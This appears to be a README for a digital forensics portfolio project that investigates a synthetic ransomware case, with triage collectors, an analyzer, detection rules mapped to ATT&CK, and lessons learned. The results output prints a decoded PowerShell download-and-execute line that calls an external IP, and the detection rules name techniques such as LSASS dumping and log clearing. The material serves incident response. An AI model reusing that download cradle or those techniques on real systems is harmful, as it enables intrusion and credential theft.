# Project 09: DFIR Endpoint Triage & Ransomware Investigation (Case IR-2026-1027)

**Skills shown:** digital forensics & incident response · live response · Windows event and Sysmon analysis · evidence integrity and chain of custody · PowerShell deobfuscation · timeline reconstruction · MITRE ATT&CK · incident report writing

This is a complete DFIR workflow on a realistic ransomware case. The case continues the phishing campaign from [Project 08](../08-phishing-investigation-forensics/): a user opens the payroll "form," and within about an hour the company file server is encrypted.

| Component | What it does |
|---|---|
| [`collectors/win_triage.ps1`](collectors/win_triage.ps1) | Read-only Windows live response in **order-of-volatility** sequence: processes (with hashes), connections, scheduled tasks, services, Run keys and WMI persistence, Sysmon/Security/System/PowerShell logs, SHA-256 manifest and collection log |
| [`collectors/linux_triage.sh`](collectors/linux_triage.sh) | Same for Linux: processes (incl. deleted binaries), sockets, cron/systemd timers, services, `authorized_keys`/rc files/`ld.so.preload`, auth logs, recently changed files |
| [`analyze_triage.py`](analyze_triage.py) | **Verifies evidence hashes first**, then runs 24 detection rules plus analytics (C2 beacon timing, mass-encryption detection, ransom notes), **decodes encoded PowerShell**, extracts IOCs, and builds a multi-host super-timeline ordered by ATT&CK tactic |
| [**Investigation report**](case/IR-2026-1027-investigation-report.md) | The deliverable: executive summary, scope, evidence register, timeline, analysis, IOCs, response actions, lessons learned |
| [Evidence handling guide](docs/evidence-handling-and-chain-of-custody.md) | RFC 3227 order of volatility, integrity rules, chain-of-custody form |

![Python](https://img.shields.io/badge/python-3.9%2B-blue) ![PowerShell](https://img.shields.io/badge/PowerShell-5.1%20%7C%207-5391FE) ![ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-21%20techniques-red) ![License](https://img.shields.io/badge/license-MIT-lightgrey)

---

## Results

```
[✓] integrity WS-0102: verified
[✓] integrity FS01: verified
[+] 305 events, 26 findings {'high': 10, 'medium': 4, 'critical': 12}
    14:25:00 WS-0102  Initial Access       T1553.005  Disk image (ISO/IMG/VHD) written by browser or mail client
    14:26:35 WS-0102  Execution            T1218.005  mshta.exe executing HTA / script
    14:26:41 WS-0102  Execution            T1059.001  Encoded / hidden PowerShell
             ↳ decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')
    14:26:58 WS-0102  Command and Control  T1071.001  C2 beaconing every ~60.1s (30 connections, jitter 0.04)
    14:27:20 WS-0102  Persistence          T1053.005  Scheduled task created (command line)
    14:50:00 WS-0102  Credential Access    T1003.001  LSASS memory dump (comsvcs MiniDump / procdump)
    14:51:40 WS-0102  Defense Evasion      T1562.001  Microsoft Defender protection disabled
    15:25:00 WS-0102  Lateral Movement     T1569.002  PsExec remote execution
    15:25:06 FS01     Impact               T1490      Shadow copies / backup catalog deleted, recovery disabled
    15:25:10 FS01     Impact               T1486      Mass encryption: 250 files renamed to *.lockd
    15:30:50 FS01     Defense Evasion      T1070.001  Event log cleared
    ...
[+] Kill chain: Initial Access → Execution → Persistence → Defense Evasion → Credential Access →
                Discovery → Lateral Movement → Command and Control → Impact
```

Full output: [`reports/triage_findings.md`](reports/triage_findings.md) · [`reports/super_timeline.csv`](reports/super_timeline.csv) · [`reports/console_output.txt`](reports/console_output.txt)

**Key findings from the case report:**
- **1 h 22 min** from email delivery to encryption, and only **58 minutes** of hands-on-keyboard time.
- The attacker reached the file server with a **backup service account** whose password was stolen from workstation memory. That's the same account [Project 06](../06-cloud-identity-security-audit/) flagged as over-privileged and Kerberoastable, so the earlier audit predicted this attack path.
- The attacker cleared the server's Security log, but **Sysmon and forwarded logs still reconstructed the full chain**.
- **No ransom was paid.** Immutable off-site backups were out of the compromised account's reach.

## Detection rules

| Tactic | Rules |
|---|---|
| Initial Access / Execution | ISO/IMG written by browser (T1553.005) · mshta (T1218.005) · encoded/hidden PowerShell (T1059.001) · Office spawning shells (T1204.002) · LOLBin download (certutil/bitsadmin) · payload dropped in user-writable path (T1105) · binary run from `Windows\Temp` by a service |
| Persistence | `schtasks /create` · Event 4698 · Event 7045 · **live** scheduled tasks pointing at user-writable paths |
| Defense Evasion | rundll32 + DLL from ProgramData/AppData (T1218.011) · Defender disabled (T1562.001) · log clearing, Event 1102 / `wevtutil cl` (T1070.001) |
| Credential Access | comsvcs MiniDump / procdump against LSASS · Sysmon 10 full-access handle to LSASS (T1003.001) |
| Discovery / Lateral Movement | Domain-admin enumeration (T1087.002) · PsExec and PSEXESVC (T1569.002) · type-3 logon from a workstation to a server (T1021.002) |
| C2 / Impact | Beacon interval analysis (T1071.001) · live external connection from a suspicious process · shadow copy / backup catalog / boot-recovery tampering (T1490) · mass renaming to a new extension and ransom notes (T1486) |

## Quick start

```bash
python3 evidence/generate_case.py                       # rebuild synthetic evidence (deterministic)
python3 analyze_triage.py evidence/WS-0102 evidence/FS01 --out reports/
python3 -m unittest discover -s tests -v               # 9 tests: integrity, tamper, rules, decode, FP checks
```

Collecting from a real host (authorized incidents only):

```powershell
# Windows, elevated, from external media (capture RAM first with a dedicated tool if possible)
.\collectors\win_triage.ps1 -OutRoot E:\IR-2026-1027 -Hours 72 -Examiner "X. West" -CaseId IR-2026-1027
```
```bash
# Linux
sudo ./collectors/linux_triage.sh /mnt/usb/IR-2026-1027 "X. West" IR-2026-1027
```

The Linux collector was run on a live system during testing. The analyzer verified its manifest and returned **0 findings on the clean host**, a useful false-positive baseline.

## Adapting to your environment

- **No Sysmon?** Deploy it with a community config (e.g., SwiftOnSecurity or Olaf Hartong's sysmon-modular). Without it, enable *Audit Process Creation* with command-line logging (Event 4688). The rules match on field names, so 4688's `NewProcessName` / `CommandLine` can be mapped in a few lines.
- **EDR platforms:** export Defender Advanced Hunting (`DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceFileEvents`), CrowdStrike or SentinelOne telemetry into `events.json` with the same field names.
- **Scale:** run the collector through EDR live response, Intune remediation scripts, or PsExec-free remoting (WinRM/JEA) and point the analyzer at many host folders at once. The timeline merges them automatically.
- **Your naming conventions:** extend `USER_WRITABLE`, the lateral-movement subnet check (DF-15), and the rule list in `RULES`. Each rule is one line of Python.

## Standards alignment

| Standard | Coverage |
|---|---|
| **NIST SP 800-61r3 / CSF 2.0** | DE.AE (analysis), RS.AN (investigation, evidence, root cause), RS.MI, RC.RP |
| **NIST SP 800-86** | Collection → examination → analysis → reporting |
| **RFC 3227 / ISO/IEC 27037** | Order of volatility, evidence preservation, chain of custody |
| **MITRE ATT&CK** | 21 techniques across 10 tactics, tagged per finding |
| **CIS Controls v8.1** | 8 (Audit Log Mgmt), 10 (Malware Defenses), 11 (Data Recovery), 17 (Incident Response) |

## Lessons learned

1. **Collect before you clean.** Re-imaging is the right fix, but only after a triage package is hashed and stored. The missing memory image is the case's biggest evidentiary gap.
2. **Deobfuscation is part of triage.** A single decoded PowerShell line turned an "encoded command" alert into a C2 IP and a URL to block.
3. **Attackers clear logs; plan for it.** Sysmon plus log forwarding meant Event 1102 cost the attacker their cover, not us our evidence.
4. **Prevention findings become incident root causes.** Local admin rights, a disabled Credential Guard, and an over-privileged service account all appeared in earlier audits (Projects 02 and 06). The case report shows what fixing them is worth.
